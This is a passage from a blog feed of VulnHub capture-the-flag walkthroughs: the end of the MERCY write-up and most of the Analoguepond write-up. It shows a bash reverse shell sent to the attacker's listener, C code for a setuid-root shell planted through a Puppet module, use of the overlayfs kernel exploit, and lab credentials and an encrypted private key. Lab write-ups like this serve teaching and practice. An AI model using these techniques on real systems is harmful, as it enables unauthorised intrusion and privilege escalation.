<p>I appended a bash one-liner to the script to send me a shell: <code>bash -i >&amp; /dev/tcp/192.168.159.129/8888 0>&amp;1</code>. But if we just run the script, the shell will still be with fluffy&rsquo;s privileges. There should be a cron or something run by root. As I was investigating, I received a root shell on my listener!</p>

<p><code>
root@MERCY:~# ls /root
ls /root
author-secret.txt
config
proof.txt
root@MERCY:~# cat /root/proof.txt
cat /root/proof.txt
Congratulations on rooting MERCY. :-)
</code></p>

<p>Indeed, cron was running the timeclock script every 3 minutes:</p>

<p><code>
*/3 * * * * bash /home/fluffy/.private/secrets/timeclock
</code></p>

<p>And the final flag and a message from the author:</p>

<p>```
root@MERCY:~# cat author-secret.txt
cat author-secret.txt
Hi! Congratulations on being able to root MERCY.</p>

<p>The author feels bittersweet about this box. On one hand, it was a box designed as a dedication to the sufferance put through by the Offensive Security team for PWK. I thought I would pay it forward by creating a vulnerable machine too. This is not meant to be a particularly difficult machine, but is meant to bring you through a good number of enumerative steps through a variety of techniques.</p>

<p>The author would also like to thank a great friend who he always teases as &ldquo;plead for mercy&rdquo;. She has been awesome. The author, in particular, appreciates her great heart, candour, and her willingness to listen to the author&rsquo;s rants and troubles. The author will stay forever grateful for her presence. She never needed to be this friendly to the author.</p>

<p>The author, as &ldquo;plead for mercy&rdquo; knows, is terrible at any sort of dedication or gifting, and so the best the author could do, I guess, is a little present, which explains the hostname of this box. (You might also have been pleading for mercy trying to root this box, considering its design.)</p>

<p>You&rsquo;ll always be remembered, &ldquo;plead for mercy&rdquo;, and Offensive Security, for making me plead for mercy!</p>

<p>Congratulations, once again, for you TRIED HARDER!</p>

<p>Regards,
The Author
```</p>

<p>This was a nice box, the RIPS vector was definitely an interesting touch!</p>

<p>```</p>

<hr />

<p>/ If your life was a horse, you&rsquo;d have to \</p>

<h2>\ shoot it.                               /</h2>

<pre><code>         \   ^__^
            \  (oo)\_______
                 (__)\       )\/\
                         ||----w |
                         ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pond. Analoguepond]]></title>
    <link href="http://chousensha.github.io/blog/2019/05/30/pond-analoguepond/"/>
    <updated>2019-05-30T21:45:50+03:00</updated>
    <id>http://chousensha.github.io/blog/2019/05/30/pond-analoguepond</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s VM should be fun, since it&rsquo;s from knightmare, so we should expect lots of references! I&rsquo;m also not sure about the actual name of the box, if it&rsquo;s Analougepond or Analoguepond. A promising start =D</p>

<blockquote><p>Remember TCP is not the only protocol on the Internet My challenges are never finished with root. I make you work for the flags. The intended
route is NOT to use forensics or 0-days, I will not complain either way.</p>

<p>To consider this VM complete, you need to have obtained:</p>

<p>   Troll Flag: where you normally look for them</p>

<p>   Flag 1: You have it when you book Jennifer tickets to Paris on Pan Am.</p>

<p>   Flag 2: It will include a final challenge to confirm you hit the jackpot.</p>

<p>   Have root everywhere (this will make sense once you&rsquo;re in the VM)</p>

<p>   User passwords</p>

<p>   2 VNC passwords</p>

<p>Best of luck! If you get stuck, eat some EXTRABACON</p>

<p>NB: Please allow 5-10 minutes or so from powering on the VM for background tasks to run before proceeding to attack.</p></blockquote>

<!-- more -->


<p>For the recon part, today I&rsquo;ll be using <a href="https://github.com/codingo/Reconnoitre">Reconnoitre</a></p>

<blockquote><p>A reconnaissance tool made for the OSCP labs to automate information gathering and service enumeration whilst creating a directory structure to store results, findings and exploits used for > each host, recommended commands to execute and directory structures for storing loot and flags.</p></blockquote>

<p>```
reconnoitre -h
usage: reconnoitre [-h] -t TARGET_HOSTS -o OUTPUT_DIRECTORY [-w WORDLIST]</p>

<pre><code>               [-p PORT] [--pingsweep] [--dns] [--services] [--hostnames]
               [--snmp] [--quick] [--virtualhosts]
               [--ignore-http-codes IGNORE_HTTP_CODES]
               [--ignore-content-length IGNORE_CONTENT_LENGTH] [--quiet]
               [--no-udp]
</code></pre>

<p>optional arguments:
  -h, &mdash;help            show this help message and exit
  -t TARGET_HOSTS       Set a target range of addresses to target. Ex</p>

<pre><code>                    10.11.1.1-255
</code></pre>

<p>  -o OUTPUT_DIRECTORY   Set the output directory. Ex /root/Documents/labs/
  -w WORDLIST           Set the wordlist to use for generated commands. Ex</p>

<pre><code>                    /usr/share/wordlist.txt
</code></pre>

<p>  -p PORT               Set the port to use. Leave blank to use discovered</p>

<pre><code>                    ports. Useful to force virtual host scanning on non-
                    standard webserver ports.
</code></pre>

<p>  &mdash;pingsweep           Write a new target.txt by performing a ping sweep and</p>

<pre><code>                    discovering live hosts.
</code></pre>

<p>  &mdash;dns, &mdash;dnssweep     Find DNS servers from a list of targets.
  &mdash;services            Perform service scan over targets.
  &mdash;hostnames           Attempt to discover target hostnames and write to</p>

<pre><code>                    0-name.txt and hostnames.txt.
</code></pre>

<p>  &mdash;snmp                Perform service scan over targets.
  &mdash;quick               Move to the next target after performing a quick scan</p>

<pre><code>                    and writing first-round recommendations.
</code></pre>

<p>  &mdash;virtualhosts        Attempt to discover virtual hosts using the specified</p>

<pre><code>                    wordlist.
</code></pre>

<p>  &mdash;ignore-http-codes IGNORE_HTTP_CODES</p>

<pre><code>                    Comma separated list of http codes to ignore with
                    virtual host scans.
</code></pre>

<p>  &mdash;ignore-content-length IGNORE_CONTENT_LENGTH</p>

<pre><code>                    Ignore content lengths of specificed amount. This may
                    become useful when a server returns a static page on
                    every virtual host guess.
</code></pre>

<p>  &mdash;quiet               Supress banner and headers to limit to comma dilimeted</p>

<pre><code>                    results only.
</code></pre>

<p>  &mdash;no-udp              Disable UDP services scan over targets.
```</p>

<p>I ran reconnoitre and it created a directory structure with multiple files:</p>

<p>```
reconnoitre -t 192.168.159.136 &mdash;services -o .
  <strong>
|\&ldquo;\&rdquo;\&ldquo;-=  RECONNOITRE
(</strong><em>_)      An OSCP scanner by @codingo</em></p>

<p>[+] Testing for required utilities on your system.
[#] Performing service scans
[<em>] Loaded single target: 192.168.159.136
[+] Creating directory structure for 192.168.159.136
   [>] Creating scans directory at: ./192.168.159.136/scans
   [>] Creating exploit directory at: ./192.168.159.136/exploit
   [>] Creating loot directory at: ./192.168.159.136/loot
   [>] Creating proof file at: ./192.168.159.136/proof.txt
[+] Starting quick nmap scan for 192.168.159.136
[+] Writing findings for 192.168.159.136
[</em>] Found SSH service on 192.168.159.136:22
[<em>] TCP quick scans completed for 192.168.159.136
[+] Starting detailed TCP/UDP nmap scans for 192.168.159.136
[+] Writing findings for 192.168.159.136
[</em>] Found SSH service on 192.168.159.136:22
[*] TCP/UDP scans completed for 192.168.159.136
```</p>

<p>The files contain the commands that were run and the output, along with recommendations. The scans revealed that SSH and SNMP are open on the box:</p>

<p><code>
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 096a5051642b555800000000
|   snmpEngineBoots: 19
|_  snmpEngineTime: 3h58m00s
| snmp-sysdescr: Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64
|_  System uptime: 3h58m0.20s (1428020 timeticks)
Service Info: Host: analoguepond
</code></p>

<p>Next I enumerated the SNMP information:</p>

<p>```
snmp-check 192.168.159.136
snmp-check v1.9 &ndash; SNMP enumerator
Copyright &copy; 2005-2015 by Matteo Cantoni (www.nothink.org)</p>

<p>[+] Try to connect to 192.168.159.136:161 using SNMPv1 and community &lsquo;public&rsquo;</p>

<p>[*] System information:</p>

<p>  Host IP address               : 192.168.159.136
  Hostname                      : analoguepond
  Description                   : Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64
  Contact                       : Eric Burdon <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#x65;&#x72;&#x69;&#x63;&#64;&#101;&#120;&#x61;&#109;&#112;&#x6c;&#x65;&#x2e;&#x63;&#x6f;&#109;">&#x65;&#x72;&#x69;&#x63;&#64;&#x65;&#120;&#x61;&#109;&#112;&#x6c;&#x65;&#46;&#99;&#x6f;&#x6d;</a>
  Location                      : There is a house in New Orleans they call it&hellip;
  Uptime snmp                   : 05:15:30.80
  Uptime system                 : 05:15:20.10
  System date                   : 2019-5-23 15:39:09.0
```</p>

<p>We have a possible user account called <em>eric</em>. I googled the line about New Orleans and found it&rsquo;s from a song:</p>

<blockquote><p>There is a house in New Orleans
They call the rising sun</p></blockquote>

<p>The credentials <code>eric/therisingsun</code> worked for SSH. In the home directory I found a funny image that may be useful for something later:</p>

<p><img class="center" src="/images/pentest/analoguepond/reticulatingsplines.gif" title="&lsquo;reticulatingsplines&rsquo; &lsquo;reticulatingsplines&rsquo;" ></p>

<p>I ran LinEnum on the box and noticed some VMs running on it:</p>

<p><code>
[-] ARP history:
barringsbank.example.com (192.168.122.3) at 52:54:00:6d:93:6a [ether] on virbr0
? (192.168.159.129) at 00:0c:29:9c:6f:0f [ether] on eth0
puppet.example.com (192.168.122.2) at 52:54:00:5b:05:f7 [ether] on virbr0
? (192.168.159.1) at 00:50:56:c0:00:01 [ether] on eth0
</code></p>

<h2>Troll flag</h2>

<p>The OS running is Ubuntu 14.04.5 LTS, so it&rsquo;s vulnerable to the <a href="https://www.exploit-db.com/exploits/39166">overlayfs exploit</a>. With it, I got root easily, and read the first flag:</p>

<p>```
root@analoguepond:/root# cat flag.txt
C'Mon Man! Y'all didn&rsquo;t think this was the final flag so soon&hellip;?</p>

<p>Did the bright lights and big city knock you out&hellip;? If you pull
a stunt like this again, I&rsquo;ll send you back to Walker&hellip;</p>

<p>This is obviously troll flah #1 So keep going.
```</p>

<h2>2 VNC passwords</h2>

<p>Ok, we have root, but this is only the beginning. We know that we should find 2 VNC passwords, and they are probably for the 2 VMs we identified earlier. I confirmed it:</p>

<p><code>
root@analoguepond:/etc/libvirt/qemu# netstat -antp | grep 5900
tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      1260/qemu-system-x8
</code></p>

<p>I searched for the VM configuration files, they were located in <code>/etc/libvirt/qemu</code>:</p>

<p><code>
root@analoguepond:/etc/libvirt/qemu# ls *.xml
barringsbank.xml  puppet.xml
</code></p>

<p>I read the files and found the password for <strong>barringsbank</strong> is <code>memphistennessee</code>, while the password for <strong>puppet</strong> is <code>sendyoubacktowalker</code>. Since nc was installed on the box, I used it to port scan the VMs. They didn&rsquo;t have 5900 port open, but they did have SSH listening:</p>

<p><code>
root@analoguepond:/etc/libvirt/qemu# nc -zv 192.168.122.3 22
Connection to 192.168.122.3 22 port [tcp/ssh] succeeded!
root@analoguepond:/etc/libvirt/qemu# nc -zv 192.168.122.2 22
Connection to 192.168.122.2 22 port [tcp/ssh] succeeded!
</code></p>

<h2>Rooting puppet</h2>

<p>I tried to SSH on the puppet VM first, to see if I can get any info, and the banner did not disappoint:</p>

<p><code>
ssh root@192.168.122.2
+-----------------------------------------------------------------------------+
| Passwords are very dated.. Removing spaces helps sandieshaw log in with her |
| most famous song                                                            |
+-----------------------------------------------------------------------------+
</code></p>

<p>We found out there&rsquo;s a sandieshaw user and got a hint for the password. After a little Googling, I learned that one of Sandie Shaw&rsquo;s most famous songs is Puppet on a String..and this suits the VM, so I removed the spaces and tried lowercase first, and got in with <code>sandieshaw/puppetonastring</code>.</p>

<p>This seems to be a Puppet-centric machine. Puppet is a tool for automating infrastructure and software configuration management. You can learn more from <a href="https://puppet.com/">https://puppet.com/</a></p>

<p>Back to the machine, I checked that Puppet is running:</p>

<p><code>
sandieshaw@puppet:~/.puppet$ ps aux | grep puppet
puppet    1020  0.9  5.1 315408 52728 ?        Ssl  09:21   0:46 /usr/bin/ruby /usr/bin/puppet master
root      3408  0.5  0.0   4448   672 ?        Ss   10:40   0:00 /bin/sh -c /usr/bin/puppet agent --test &gt; /dev/null 2&gt;&amp;1
root      3409 24.8  1.9  79220 20312 ?        Sl   10:40   0:04 /usr/bin/ruby /usr/bin/puppet agent --test
</code></p>

<p>Then I looked inside puppet&rsquo;s config directory, in <em>/etc/puppet</em>, and I found lots of configuration files for the barringsbank VM inside <code>modules/vulnhub/files/</code>:</p>

<p><code>
sandieshaw@puppet:/etc/puppet/modules/vulnhub/files$ ls
barringsbank-group    barringsbank-passwd       hosts.deny    puppet-hosts.allow  puppet-sshd_config  sudoers
barringsbank-hosts.allow  barringsbank-sshd_config  puppet-group  puppet-passwd       sshd_config     sudoers.d
</code></p>

<p>In the <em>barringsbank-passwd</em> file, I found the user list, the interesting one to keep in mind is:</p>

<p><code>
nleeson:x:1000:1000:Nicholas Leeson,,,:/home/nleeson:/bin/bash
</code></p>

<p>Continuing with the information gathering, the <em>barringsbank-sshd_config</em> reveals that public key authentication is used for SSH on the VM.</p>

<p>Inside <em>manifests</em> there&rsquo;s a module called <em>init.pp</em> that removes from the system the useful command line utilities lice nmap, ncaat, etc. and reverses changes to key system files. It&rsquo;s pretty funny and contains references to various Vulnhub users.</p>

<p>```</p>

<h2>Module to unwind changed #vulnhub people make.  This will unwind the most</h2>

<h2>common vectors they used to get at my other VMs</h2>

<p>class vulnhub {</p>

<h2>purge packages they abuse too (hello mrB3n, GKNSB, Ch3rn0byl, mr_h4sh)</h2>

<p>$purge = [ &ldquo;nano&rdquo;, &ldquo;wget&rdquo;, &ldquo;curl&rdquo;, &ldquo;fetch&rdquo;,&ldquo;nmap&rdquo;, &ldquo;netcat-traditional&rdquo;,</p>

<pre><code>       "ncat", "netdiscover", "lftp" ]
</code></pre>

<p>  package { $purge:
  ensure => purged,
  }</p>

<h2>The encryption is still primative Egyptian (Hello drweb)</h2>

<p>$theresas_nightmare = [ &ldquo;cryptcat&rdquo;, &ldquo;socat&rdquo; ]
  package { $theresas_nightmare:
  ensure => present,
  }</p>

<h2>Adding to sudoers is a bit naughty so reverse that (most of #vulnhub)</h2>

<p>file { &ldquo;/etc/sudoers.d&rdquo;:
  ensure => &ldquo;directory&rdquo;,
  recurse => true,
  purge   => true,
  force   => true,
  owner   => root,
  group   => root,
  mode    => 0755,
  source  => &ldquo;puppet:///modules/vulnhub/sudoers.d&rdquo;,
  }</p>

<h2>revert /etc/passwd (Hey rfc, kevinnz!)</h2>

<p>file {&lsquo;/etc/sudoers&rsquo;:
  ensure => present,
  owner  => root,
  group  => root,
  mode   => 0440,
  source => &ldquo;puppet:///modules/vulnhub/sudoers&rdquo;,
  }</p>

<h2>revert /etc/passwd (Hey Rasta_Mouse!)</h2>

<p>file {&lsquo;/etc/passwd&rsquo;:
  ensure => present,
  owner  => root,
  group  => root,
  mode   => 0644,
  source => &ldquo;puppet:///modules/vulnhub/${hostname}-passwd&rdquo;,
  }</p>

<h2>and /etc/group (Hello to you cmaddy)</h2>

<p>file {&lsquo;/etc/group&rsquo;:
  ensure => present,
  owner  => root,
  group  => root,
  mode   => 0644,
  source => &ldquo;puppet:///modules/vulnhub/${hostname}-group&rdquo;,
  }</p>

<h2>Mr Potato Head! BACKDOORS ARE NOT SECRETS (Hey GKNSB!)</h2>

<p>file {&lsquo;/etc/ssh/ssd_config&rsquo;:
  ensure => present,
  owner  => root,
  group  => root,
  mode   => 0644,
  source => &ldquo;puppet:///modules/vulnhub/${hostname}-sshd_config&rdquo;,
  notify => Service[&ldquo;ssh&rdquo;],
  }</p>

<h2>Leave US keyboard for those crazy yanks, and not to torture Ch3rn0byl like</h2>

<h2>Gibson</h2>

<p>cron { &ldquo;puppet check in&rdquo;:
  command => &ldquo;/usr/bin/puppet agent &mdash;test > /dev/null 2>&amp;1&rdquo;,
  user => &ldquo;root&rdquo;,
  minute => &ldquo;*/10&rdquo;,
  ensure => present,
  }</p>

<h2>Everyone forbidden by default (Hey wrboyce, rasta_mouse, 8bitkiwi)</h2>

<p>file {&lsquo;/etc/hosts.deny&rsquo;:
  ensure => present,
  owner  => root,
  group  => root,
  mode   => 0644,
  source => &ldquo;puppet:///modules/vulnhub/hosts.deny&rdquo;,
  }</p>

<h2>Firewall off to only specific hosts (Hello Bas!)</h2>

<p>file {&lsquo;/etc/hosts.allow&rsquo;:
  ensure => present,
  owner  => root,
  group  => root,
  mode   => 0644,
  source => &ldquo;puppet:///modules/vulnhub/${hostname}-hosts.allow&rdquo;,
  }</p>

<h2>Don&rsquo;t fill up the disk (Hey GlobalMaquereau, g0bl1n)</h2>

<p>tidy { &ldquo;/var/lib/puppet/reports&rdquo;:
   age     => &ldquo;1h&rdquo;,
   recurse => true,
  }</p>

<h2>Changing openssh config requires restart</h2>

<p>service { &lsquo;ssh&rsquo;:
  ensure      => running,
  enable      => true,
  hasstatus   => true,
  hasrestart  => true,
  }</p>

<p>}
```</p>

<p>Inside the <em>fiveeights</em> module there&rsquo;s another file referencing the contents of SSH authorized keys for the nleeson user:</p>

<p>```
sandieshaw@puppet:/etc/puppet/modules$ cat fiveeights/manifests/init.pp</p>

<h2>Nick&rsquo;s secret file hide the screw-ups</h2>

<p>class fiveeights {</p>

<h2>private key held elsewhere. Keep looking</h2>

<p>  file { &lsquo;/home/nleeson/.ssh/authorized_keys&rsquo;:
  content => &ldquo;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCTPnm+I5zEPNUHc1PgmsIxK8XCvtRECY6nTFOdNL3CxVBepWLv0wgPWBIUAkP9nfPUshXo1EIjcvb0+RGtJ8KNbVK4vW2ZCwgNicUoYnCcVtSrGtz9oAnKpeGcCKAuHG6ybt4Opxe75eF4dZt2/aDRrPMw8PK8l8a3o9ZdJlIgdLiWORPiga/zUu1zuySkQPFHzPBp29MvWVwAYsssEjcXINfuvysPbdBzMJaJ2o4jmFV9g/uCz3xjRi9zULP1VpoRYtZUQadU2CpuN1RtVDeoSeYVe6vYkeLz6rCBQTUfi9Nea4X1JtvaTfnrquRMWOr43WnMMcdFpIsBd8oCI4jH root@puppet&rdquo;,
  }
}
```</p>

<p>Another interesting module is the <em>wiggle</em> one, that references a binary called <em>spin</em> that needs to be present in /tmp, and when puppet runs it will change its ownership to root and make it SUID:</p>

<p>```
sandieshaw@puppet:/etc/puppet/modules$ cat wiggle/manifests/init.pp</p>

<h2>My first puppet module by Nick Leeson &copy; Barringsbank</h2>

<h2>Put spin binary in /tmp to confirm puppet is working</h2>

<p>class wiggle {</p>

<p>file { [ &ldquo;/tmp/spin&rdquo; ]:
  ensure  => present,
  mode    => 4755,
  owner   => root,
  group   => root,
  source  => &ldquo;puppet:///modules/wiggle/spin&rdquo;;
  }</p>

<p>}
```</p>

<p>This module looks like the way in for privilege escalation. You can find the spin binary and its source code inside <em>/etc/puppet/modules/wiggle/files</em>, it just spins the cursor and outputs a character out of a list. Not too useful, but our sandieshaw user is the owner and has write permissions over it:</p>

<p><code>
sandieshaw@puppet:/etc/puppet/modules/wiggle/files$ ls -l
total 724
-rwxrwxr-x 1 sandieshaw sandieshaw 733480 Dec 21  2016 spin
-rw-rw-r-- 1 sandieshaw sandieshaw    376 Dec 17  2016 spin.c
</code></p>

<p>In order to exploit this, I created a malicious spin executable with a SUID shell:</p>

<p>```c</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;unistd.h></h1>

<p>int main(void)
{</p>

<pre><code>setuid(0);
setgid(0);
system("/bin/sh");
</code></pre>

<p>}
```</p>

<p>Then I copied it to the box:</p>

<p><code>plain
scp spin eric@192.168.159.136:/home/eric
</code></p>

<p>Next I transferred it to the puppet VM:</p>

<p><code>
eric@analoguepond:~$ scp spin sandieshaw@192.168.122.2:/etc/puppet/modules/wiggle/files/spin
sandieshaw@puppet:/etc/puppet/modules/wiggle/files$ ls -l spin
-rwxrwxr-x 1 sandieshaw sandieshaw 16712 May 29 15:42 spin
</code></p>

<p>The next time the puppet agent runs, it puts the malicious spin binary in /tmp and makes it SUID root:</p>

<p><code>
ls -l /tmp
total 20
-rwsr-xr-x 1 root root 16712 May 29 15:43 spin
</code></p>

<p>We are now able to become root:</p>

<p>```
sandieshaw@puppet:~$ /tmp/spin</p>

<h1>ls /root</h1>

<p>protovision
```</p>

<p>Inside /root/protovision we find some files and a hidden directory:</p>

<p>```</p>

<h1>ls -alh</h1>

<p>total 24K
drwxr-xr-x 3 root root 4.0K Dec 21  2016 .
drwx&mdash;&mdash;&mdash; 4 root root 4.0K Jan  7  2017 ..
-rw-r&mdash;r&mdash; 1 root root  401 Dec 21  2016 flag1.txt.0xff
drwxr-xr-x 3 root root 4.0K Dec 21  2016 .I_have_you_now
-rw-r&mdash;r&mdash; 1 root root   39 Dec 17  2016 jim
-rw-r&mdash;r&mdash; 1 root root   53 Dec 17  2016 melvin
```</p>

<p>Checking the flag first:</p>

<p>```</p>

<h1>cat flag1.txt.0xff</h1>

<p>3d3d674c7534795a756c476130565762764e4849793947496c4a585a6f5248496b4a3362334e3363684248496842435a756c6d5a675148616e6c5762675533623542434c756c47497a564764313557617442794d79415362764a6e5a674d585a7446325a79463256676732593046326467777961793932646751334a754e585a765247497a6c47613042695a4a4279615535454d70647a614b706b5a48316a642f67325930463264763032626a35535a6956486431395765756333643339794c364d486330524861
```</p>

<p>This hex string is decoded to a revere base64 string:</p>

<p><code>
==gLu4yZulGa0VWbvNHIy9GIlJXZoRHIkJ3b3N3chBHIhBCZulmZgQHanlWbgU3b5BCLulGIzVGd15WatByMyASbvJnZgMXZtF2ZyF2Vgg2Y0F2dgwyay92dgQ3JuNXZvRGIzlGa0BiZJByaU5EMpdzaKpkZH1jd/g2Y0F2dv02bj5SZiVHd19Weuc3d39yL6MHc0RHa
</code></p>

<p>I reversed it and decoded it for this hint:</p>

<p><code>
https://www.youtube.com/watch?v=GfJJk7i0NTk If this doesn't work, watch Wargames from 23 minutes in, you might find a password there or something...
</code></p>

<p>Watching the clip, the interesting line is the shouted &ldquo;Backdoors are not secrets&rdquo;. This is confirmed by the jim and melvin files:</p>

<p>```</p>

<h1>cat jim</h1>

<p>Mr Potato Head! Backdoors are not a&hellip;</p>

<h1>cat melvin</h1>

<p>Boy you guys are dumb! I got this all figured out&hellip;
```</p>

<p>Inside the hidden folder we find a picture and another hidden folder:</p>

<p><code>
drwxr-xr-x 3 root root 4.0K Dec 18  2016 .a
-r-------- 1 root root  71K Dec 18  2016 grauniad_1995-02-27.jpeg
</code></p>

<p>The picture states that Barings Bank goes bust. The hidden folder goes on with another and another so I enumerated all:</p>

<p>```</p>

<h1>find . -type d</h1>

<p>.
./.a
./.a/.b
./.a/.b/.c
./.a/.b/.c/.d
./.a/.b/.c/.d/.e
./.a/.b/.c/.d/.e/.f
./.a/.b/.c/.d/.e/.f/.g
./.a/.b/.c/.d/.e/.f/.g/.h
./.a/.b/.c/.d/.e/.f/.g/.h/.i
./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j
./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k
./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l
./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m
./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n
./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o
./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p
./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q
./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r
./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s
./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t
./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u.
./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u./v.
./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u./v./w.
./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u./v./w./x.
./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u./v./w./x./y
./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u./v./w./x./y/.z
```</p>

<p>All the way down, we find 2 files:</p>

<p>```</p>

<h1>ls</h1>

<p>my_world_you_are_persistent_try  nleeson_key.gpg
```</p>

<p>Let&rsquo;s see what we have here:</p>

<p>```</p>

<h1>cat my_world_you_are_persistent_try</h1>

<p>joshua
```</p>

<p>Might be a password for something later. The other file is related to the nleeson user we found on the other VM a while ago. I tried to decrypt it with the password <em>secrets</em>, but it didn&rsquo;t work. But the hint in the jim file was referring to a secret, so I tried <code>secret</code> and it decrypted a private SSH key for nleeson:</p>

<p>```</p>

<h1>gpg -d nleeson_key.gpg</h1>

<p>gpg: CAST5 encrypted data
gpg: gpg-agent is not available in this session
gpg: encrypted with 1 passphrase
&mdash;&mdash;-BEGIN RSA PRIVATE KEY&mdash;&mdash;&ndash;
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,1864E0393453C88F778D5E02717B8B16</p>

<p>RTSpHZnf1Onpy3OHfSat0Bzbrx8wd6EBKlbdZiGjEB0AC4O0ylrSBoWsEJ/loSL8
jdTbcSG0/GWJU7CS5AQdK7KctWwqnOHe9y4V15gtZcfgxNLrVfMUVAurZ3n2wQqK
ARmqBXhftPft8EBBAwWwQmBrD+ufF2uaJoKr4Bfu0zMFQxRnNDooBes5wyNO/7k6
osvGqTEX/xwJG1GB5X0jsDCmBH4WXhafa0nzZXvd2Pd3UpaWPEgyq3vxIQaredR8
VbJbPSeKypTIj3UyEj+kjczhCiWw9t0Mv0aV4FtMOesnDQYJskL8kSLGRkN+7lHD
IcHz7az9oqYGBSq77lPkmk7oIpT/pg80pfCyHExROwlTRPzVRHv7KGiKd35R0Hl9
7CUQPCjH5ltQW4B6XUmxmoT8N14w5HOxb/JlV7s2g6dXYT0azOeqDsGivpgMY3vy
rtVakLIsZeYaZYSr6WvTFclXWYctYPMgzRewiRPjyn6DXiD6MtCJZj2CqJ47tP37
eRRgRRH6a1Sm/BkfSPIXlV0tTpOXfjtHG7VoIc5X343GL/WHM/nhNFvMLdRnVXRM
YOEKAsYklBLqZ99btTESwJZt9HG/cGpQrbgFwxKPoJy7f5wNLOa1ZhpDyw1IqokO
Pq4r8zZj4ASyg3gl7ByG11C272mkMG8yiIwOckVgNec/se18PUGBw1HHgRuyzDym
/6/cwkDzoJlResjsNDQCQcNzSOoZxi3GFIIiB+HjG84MF+ofnn3ayaUZLUaBbPMJ
jQ7dP6wqIMYwY5ZM6nRQ+RnL6QVBHnXH9RjmbzdVMzmQDjPS0lOg5xkU8B78vG6e
lphvmlLSM+PFVOqPwhVB8yon97aU23npKIOPu44VsUXU0auKI94qoX0I1EDDQFrE
UqpWUpCCHrRRTZCdnnE6RnJZ+rjGPvFA95lhUp1fpF8l4U3a8qKlsdtWmzYxHdyg
+w0QE8VdDsNqgCP7W6KzvN5E5HJ0bbQasadAX5eDd6I94V0fCZrPlzM+5CAXH4E4
qhmWQPCw7Q1CnW61yG8e9uD1W7yptK5NyZpHHkUbZGIS+P7EZtS99zDPh3V4N7I2
Mryzxkmi2JyQzf4T1cfK7JTdIC2ULGmFZM26BX3UCV0K+9OOGgRDPU4noS0gNHxP
VaWVmjGgubE4GDlW0tgw1ET+LaUdAv/LE+3gghpRLn1imdaW9elnIeaVeOWcyrBC
Ypl8AjYXNRd0uLWBC8xbakmK1tZUPXwefqjQpKjuIuYmmVes3M4DFxGQajmK03nO
oGaByHu0RVjy0x/zBuOuOp6eKpeaiLWfLM5DSIWlksL/2dmAloSs3LrIPu4dTnRb
v2YQ+72nLI62alLEaKwXUBoHSSRNTv0hbOyvV8YUp4EmJ8yShAmEE/n9Et62BwYB
rsi0RhEfih+43PzlwB91I4Elr2k3eBwQ9XiF3KdVgj6wvwqNLZ7aC5YpLcYaVyNT
fKzUxX02Ejvo60xWJ8u6GIhUK404s2WVeG/PCLwtrKGjpyPCn3yCWpCWpGPuVNrx
Wg0Um581e4Vw5CLDL5hRLmo7wiqssuL3/Uugf/lc2vF+MxJyoI1F9Zkt2xvRYrLB
&mdash;&mdash;-END RSA PRIVATE KEY&mdash;&mdash;&ndash;
gpg: WARNING: message was not integrity protected
```</p>

<p>I extracted the private key and used it to SSH to the other VM as nleeson. It asked for a passphrase, and I used <em>joshua</em> from the file:</p>

<p>```
gpg nleeson_key.gpg > nleeson_key
chmod 600 nleeson</p>

<h1>ssh -i nleeson <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#110;&#108;&#x65;&#x65;&#115;&#111;&#110;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#49;&#x32;&#x32;&#46;&#51;">&#x6e;&#x6c;&#x65;&#101;&#115;&#111;&#x6e;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#x31;&#x32;&#x32;&#46;&#51;</a></h1>

<p>Enter passphrase for key &lsquo;nleeson&rsquo;:
Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 4.4.0-57-generic x86_64)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a></li>
</ul>


